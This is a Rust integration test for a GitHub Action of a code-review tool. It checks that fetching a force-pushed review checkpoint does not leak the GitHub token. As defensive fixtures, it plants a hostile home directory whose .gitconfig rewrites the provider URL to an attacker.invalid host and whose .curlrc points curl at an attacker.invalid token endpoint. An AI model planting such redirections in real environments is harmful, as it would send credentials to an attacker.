#![cfg(unix)]

use std::{
    fs,
    os::unix::fs::PermissionsExt,
    path::{Path, PathBuf},
    process::Command,
};

use serde_json::Value;

fn git(repository: &Path, arguments: &[&str]) -> String {
    let output = Command::new("git")
        .arg("-C")
        .arg(repository)
        .args(arguments)
        .env("LC_ALL", "C")
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "git {} failed: {}",
        arguments.join(" "),
        String::from_utf8_lossy(&output.stderr)
    );
    String::from_utf8(output.stdout).unwrap().trim().to_owned()
}

fn commit(repository: &Path, message: &str) -> String {
    git(repository, &["add", "--all"]);
    git(repository, &["commit", "-q", "-m", message]);
    git(repository, &["rev-parse", "HEAD"])
}

fn write_executable(path: &Path, contents: &str) {
    fs::write(path, contents).unwrap();
    let mut permissions = fs::metadata(path).unwrap().permissions();
    permissions.set_mode(0o755);
    fs::set_permissions(path, permissions).unwrap();
}

fn command_path(command: &str) -> PathBuf {
    let output = Command::new("sh")
        .arg("-c")
        .arg(format!("command -v {command}"))
        .output()
        .unwrap();
    assert!(output.status.success());
    PathBuf::from(String::from_utf8(output.stdout).unwrap().trim())
}

#[test]
fn action_materializes_a_force_pushed_review_commit_without_exposing_the_token() {
    let directory = tempfile::tempdir().unwrap();
    let source = directory.path().join("source");
    let provider = directory.path().join("provider.git");
    let caller = directory.path().join("caller");
    let runner = directory.path().join("runner");
    let fake_bin = directory.path().join("fake-bin");
    let malicious_home = directory.path().join("malicious-home");
    for path in [&source, &runner, &fake_bin, &malicious_home] {
        fs::create_dir(path).unwrap();
    }

    git(&source, &["init", "-q"]);
    git(&source, &["config", "user.name", "StrataDiff Test"]);
    git(
        &source,
        &["config", "user.email", "stratadiff@example.test"],
    );
    fs::write(source.join("review.py"), "value = 0\n").unwrap();
    let base = commit(&source, "base");

    git(&source, &["checkout", "-q", "-b", "reviewed"]);
    fs::write(source.join("review.py"), "value = 1\n").unwrap();
    let checkpoint = commit(&source, "reviewed checkpoint");

    git(&source, &["checkout", "-q", "-b", "current", &base]);
    fs::write(source.join("review.py"), "value = 1\n").unwrap();
    let head = commit(&source, "force-pushed equivalent");

    git(&source, &["checkout", "-q", "-b", "unrelated", &base]);
    fs::write(source.join("unrelated.bin"), vec![b'x'; 256 * 1024]).unwrap();
    let unrelated = commit(&source, "unrelated provider history");

    let initialized = Command::new("git")
        .arg("init")
        .arg("--bare")
        .arg("--quiet")
        .arg(&provider)
        .output()
        .unwrap();
    assert!(initialized.status.success());
    git(
        &source,
        &[
            "push",
            "-q",
            provider.to_str().unwrap(),
            &format!("{checkpoint}:refs/heads/reviewed"),
            &format!("{unrelated}:refs/heads/unrelated"),
        ],
    );

    fs::create_dir(&caller).unwrap();
    git(&caller, &["init", "-q"]);
    git(
        &caller,
        &[
            "fetch",
            "-q",
            source.to_str().unwrap(),
            &format!("{head}:refs/heads/current"),
        ],
    );
    git(&caller, &["checkout", "-q", "current"]);
    git(
        &caller,
        &[
            "config",
            "url.https://attacker.invalid/.insteadOf",
            "https://github.example/",
        ],
    );
    let fetch_head_before = fs::read(caller.join(".git/FETCH_HEAD")).unwrap();
    assert!(
        !Command::new("git")
            .arg("-C")
            .arg(&caller)
            .args(["cat-file", "-e", &format!("{checkpoint}^{{commit}}")])
            .output()
            .unwrap()
            .status
            .success()
    );
    assert!(
        !Command::new("git")
            .arg("-C")
            .arg(&caller)
            .args(["cat-file", "-e", &format!("{unrelated}^{{commit}}")])
            .output()
            .unwrap()
            .status
            .success()
    );

    fs::write(
        malicious_home.join(".gitconfig"),
        "[url \"https://attacker.invalid/\"]\n\tinsteadOf = https://github.example/\n",
    )
    .unwrap();
    fs::write(
        malicious_home.join(".curlrc"),
        "url = \"https://attacker.invalid/token\"\n",
    )
    .unwrap();

    let reviews = directory.path().join("reviews.json");
    fs::write(
        &reviews,
        format!(
            r#"[{{"id":17,"user":{{"login":"alice","type":"User"}},"state":"APPROVED","html_url":"https://github.example/owner/repo/pull/7#pullrequestreview-17","commit_id":"{checkpoint}","submitted_at":"2026-09-05T10:00:00Z","author_association":"MEMBER"}}]"#
        ),
    )
    .unwrap();
    let commit_object = directory.path().join("commit.json");
    fs::write(&commit_object, format!(r#"{{"sha":"{checkpoint}"}}"#)).unwrap();
    let git_markers = directory.path().join("git-markers");
    fs::create_dir(&git_markers).unwrap();
    let curl_log = directory.path().join("curl.log");

    write_executable(
        &fake_bin.join("cargo"),
        r#"#!/usr/bin/env bash
set -euo pipefail
target=
while (($#)); do
  if [[ "$1" == --target-dir ]]; then
    target="$2"
    shift 2
  else
    shift
  fi
done
[[ -n "${target}" ]]
mkdir -p "${target}/release"
cp "${TEST_STRATADIFF_BINARY}" "${target}/release/stratadiff"
"#,
    );
    write_executable(
        &fake_bin.join("curl"),
        r#"#!/usr/bin/env bash
set -euo pipefail
[[ "$1" == --disable ]]
printf '%s\n' "$1" >> "${TEST_CURL_LOG}"
shift
output=
headers=
url=
while (($#)); do
  case "$1" in
    --config|--max-filesize|--output|--write-out|--dump-header)
      option="$1"
      value="$2"
      shift 2
      case "${option}" in
        --output) output="${value}" ;;
        --dump-header) headers="${value}" ;;
      esac
      ;;
    *)
      url="$1"
      shift
      ;;
  esac
done
if [[ -n "${headers}" ]]; then
  printf 'HTTP/1.1 200 OK\r\n\r\n' > "${headers}"
fi
case "${url}" in
  */pulls/7/reviews?per_page=100) cp "${TEST_REVIEWS_JSON}" "${output}" ;;
  */git/commits/*) cp "${TEST_COMMIT_JSON}" "${output}" ;;
  *) exit 92 ;;
esac
printf 200
"#,
    );
    write_executable(
        &fake_bin.join("git"),
        r#"#!/usr/bin/env bash
set -euo pipefail
arguments=("$@")
network_fetch=false
local_import=false
for ((index = 0; index < ${#arguments[@]}; index++)); do
  if [[ "${arguments[index]}" == "${TEST_PROVIDER_URL}" ]]; then
    arguments[index]="${TEST_PROVIDER_REPOSITORY}"
    network_fetch=true
  elif [[ "${arguments[index]}" == */stratadiff-provider-*.tmp/repository.git ]]; then
    local_import=true
  fi
done
if [[ "${network_fetch}" == true ]]; then
  [[ "${HOME}" == */stratadiff-provider-*.tmp/home ]]
  [[ "${GIT_CONFIG_VALUE_1:-}" == "AUTHORIZATION: basic "* ]]
  [[ -n "${STRATADIFF_GITHUB_TOKEN:-}" ]]
  : > "${TEST_GIT_MARKER_DIRECTORY}/provider-fetch"
else
  [[ -z "${STRATADIFF_GITHUB_TOKEN:-}" ]]
fi
if [[ "${local_import}" == true ]] && [[ " ${arguments[*]} " == *" fetch "* ]]; then
  : > "${TEST_GIT_MARKER_DIRECTORY}/tokenless-local-import"
fi
"${TEST_REAL_GIT}" "${arguments[@]}"
"#,
    );

    let output_file = directory.path().join("github-output.txt");
    let summary_file = directory.path().join("github-summary.md");
    let path = format!("{}:{}", fake_bin.display(), std::env::var("PATH").unwrap());
    let output = Command::new("bash")
        .arg("--noprofile")
        .arg("--norc")
        .arg(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/scripts/github_action_review.sh"
        ))
        .env("PATH", path)
        .env("HOME", &malicious_home)
        .env("CURL_HOME", &malicious_home)
        .env("RUNNER_TEMP", &runner)
        .env("GITHUB_RUN_ID", "123")
        .env("GITHUB_RUN_ATTEMPT", "1")
        .env("GITHUB_ACTION_PATH", env!("CARGO_MANIFEST_DIR"))
        .env("GITHUB_OUTPUT", &output_file)
        .env("GITHUB_STEP_SUMMARY", &summary_file)
        .env("STRATADIFF_BASE", &base)
        .env("STRATADIFF_HEAD", &head)
        .env("STRATADIFF_CHECKPOINT", "")
        .env("STRATADIFF_REVIEWER", "alice")
        .env("STRATADIFF_GITHUB_TOKEN", "secret-token")
        .env("STRATADIFF_PULL_REQUEST_INPUT", "7")
        .env("STRATADIFF_FAIL_ON_REVIEW_RESIDUE", "true")
        .env("STRATADIFF_REPOSITORY", &caller)
        .env("STRATADIFF_GITHUB_API_URL", "https://api.github.example")
        .env("STRATADIFF_GITHUB_SERVER_URL", "https://github.example")
        .env("STRATADIFF_GITHUB_REPOSITORY", "owner/repo")
        .env("STRATADIFF_EVENT_PULL_REQUEST", "")
        .env("TEST_STRATADIFF_BINARY", env!("CARGO_BIN_EXE_stratadiff"))
        .env("TEST_REVIEWS_JSON", &reviews)
        .env("TEST_COMMIT_JSON", &commit_object)
        .env("TEST_PROVIDER_URL", "https://github.example/owner/repo.git")
        .env("TEST_PROVIDER_REPOSITORY", &provider)
        .env("TEST_REAL_GIT", command_path("git"))
        .env("TEST_GIT_MARKER_DIRECTORY", &git_markers)
        .env("TEST_CURL_LOG", &curl_log)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "stdout:\n{}\nstderr:\n{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );

    let action_outputs = fs::read_to_string(&output_file).unwrap();
    assert!(action_outputs.contains(&format!("checkpoint={checkpoint}\n")));
    assert!(action_outputs.contains("checkpoint_source=github_review\n"));
    let report_path = action_outputs
        .lines()
        .find_map(|line| line.strip_prefix("report="))
        .unwrap();
    let report: Value = serde_json::from_slice(&fs::read(report_path).unwrap()).unwrap();
    assert_eq!(report["checkpoint"]["commit"], checkpoint);
    assert_eq!(report["summary"]["checkpoint"]["needs_review_now_files"], 0);
    assert_eq!(git(&caller, &["merge-base", &base, &checkpoint]), base);
    assert_eq!(git(&caller, &["cat-file", "-t", &checkpoint]), "commit");
    assert!(
        !Command::new("git")
            .arg("-C")
            .arg(&caller)
            .args(["cat-file", "-e", &format!("{unrelated}^{{commit}}")])
            .output()
            .unwrap()
            .status
            .success()
    );
    assert!(
        git(&caller, &["for-each-ref", "refs/stratadiff/checkpoints"]).is_empty(),
        "temporary checkpoint ref was not cleaned up"
    );
    assert_eq!(
        fs::read(caller.join(".git/FETCH_HEAD")).unwrap(),
        fetch_head_before
    );
    assert!(git_markers.join("provider-fetch").is_file());
    assert!(git_markers.join("tokenless-local-import").is_file());
    assert_eq!(
        fs::read_to_string(&curl_log).unwrap(),
        "--disable\n--disable\n"
    );
    let sensitive_prefixes = [
        "stratadiff-provider-",
        "stratadiff-reviews-",
        "stratadiff-review-headers-",
        "stratadiff-commit-object-",
        "stratadiff-request-headers-",
        "stratadiff-curl-",
    ];
    assert!(fs::read_dir(&runner).unwrap().all(|entry| {
        let name = entry.unwrap().file_name();
        let name = name.to_string_lossy();
        sensitive_prefixes
            .iter()
            .all(|prefix| !name.starts_with(prefix))
    }));
}
